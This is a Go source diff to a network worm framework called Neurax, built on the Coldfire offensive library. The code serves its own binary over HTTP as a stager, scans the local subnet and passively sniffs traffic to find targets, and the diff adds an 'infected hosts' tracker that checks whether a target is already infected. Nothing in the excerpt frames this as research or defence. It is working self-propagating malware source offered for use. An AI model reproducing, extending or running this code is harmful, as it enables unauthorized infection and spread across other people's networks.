@@ -4,11 +4,9 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
-	"net"
 	"net/http"
 	"os"
 	"runtime"
-	"strconv"
 	"strings"
 	"time"
 
@@ -20,46 +18,46 @@ import (
 	coldfire "github.com/redcode-labs/Coldfire"
 )
 
+var infected_hosts = []string{}
+
 type __NeuraxConfig struct {
-	stager           string
-	port             int
-	knock_port       string
-	prevent_reinfect bool
-	local_ip         string
-	path             string
-	file_name        string
-	platform         string
-	cidr             string
-	scan_passive     bool
-	scan_timeout     int
-	read_arp_cache   bool
-	threads          int
-	full_range       bool
-	base64           bool
-	required_port    int
-	verbose          bool
-	remove           bool
+	stager         string
+	port           int
+	comm_port      int
+	local_ip       string
+	path           string
+	file_name      string
+	platform       string
+	cidr           string
+	scan_passive   bool
+	scan_timeout   int
+	read_arp_cache bool
+	threads        int
+	full_range     bool
+	base64         bool
+	required_port  int
+	verbose        bool
+	remove         bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
-	stager:           "random",
-	port:             coldfire.RandomInt(2222, 9999),
-	knock_port:       strconv.Itoa(coldfire.RandomInt(2222, 9999)),
-	required_port:    0,
-	prevent_reinfect: true,
-	local_ip:         coldfire.GetLocalIp(),
-	path:             "random",
-	file_name:        "random",
-	platform:         runtime.GOOS,
-	cidr:             coldfire.GetLocalIp() + "/24",
-	scan_passive:     false,
-	scan_timeout:     2,
-	read_arp_cache:   false,
-	threads:          10,
-	full_range:       false,
-	base64:           false,
-	verbose:          false,
-	remove:           false,
+	stager:         "random",
+	port:           coldfire.RandomInt(2222, 9999),
+	comm_port:      coldfire.RandomInt(2222, 9999),
+	required_port:  0,
+	local_ip:       coldfire.GetLocalIp(),
+	path:           "random",
+	file_name:      "random",
+	platform:       runtime.GOOS,
+	cidr:           coldfire.GetLocalIp() + "/24",
+	scan_passive:   false,
+	scan_timeout:   2,
+	read_arp_cache: false,
+	threads:        10,
+	full_range:     false,
+	base64:         false,
+	verbose:        false,
+	remove:         false,
 }
 
 func ReportError(message string, e error) {
@@ -128,9 +126,9 @@ func NeuraxStager() string {
 }
 
 func NeuraxServer() {
-	if NeuraxConfig.prevent_reinfect {
+	/*if NeuraxConfig.prevent_reinfect {
 		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
-	}
+	}*/
 	data, _ := ioutil.ReadFile(os.Args[0])
 	if NeuraxConfig.base64 {
 		data = []byte(coldfire.B64E(string(data)))
@@ -141,7 +139,7 @@ func NeuraxServer() {
 	}))
 }
 
-func is_host_active(target string) bool {
+func IsHostActive(target string) bool {
 	first := 19
 	last := 300
 	if NeuraxConfig.full_range {
@@ -149,7 +147,7 @@ func is_host_active(target string) bool {
 	}
 	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.scan_timeout)*time.Second, NeuraxConfig.threads)
 	opened_ports := ps.GetOpenedPort(first, last)
-	if len(opened_ports) != 0 && !coldfire.PortscanSingle(target, 7123) {
+	if len(opened_ports) != 0 && !IsHostInfected(target) {
 		if NeuraxConfig.required_port == 0 {
 			return true
 		} else {
@@ -161,12 +159,28 @@ func is_host_active(target string) bool {
 	return false
 }
 
+func IsHostInfected(target string) bool {
+	if coldfire.Contains(infected_hosts, target) {
+		return true
+	}
+	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.port)
+	rsp, err := http.Get(target_url)
+	if err != nil {
+		return false
+	}
+	if rsp.StatusCode == 200 {
+		infected_hosts = append(infected_hosts, target)
+		return true
+	}
+	return false
+}
+
 func NeuraxScan(c chan string) {
 	if NeuraxConfig.scan_passive {
 		var snapshot_len int32 = 1024
 		var timeout time.Duration = 500000 * time.Second
 		devices, err := pcap.FindAllDevs()
-		ReportError("Cannor obtain networkinterfaces", err)
+		ReportError("Cannot obtain network interfaces", err)
 		for _, device := range devices {
 			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
 			ReportError("Cannot open device", err)
@@ -201,7 +215,7 @@ func NeuraxScan(c chan string) {
 		}
 		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
 		for _, target := range targets {
-			if is_host_active(target) {
+			if IsHostActive(target) {
 				c <- target
 			}
 		}
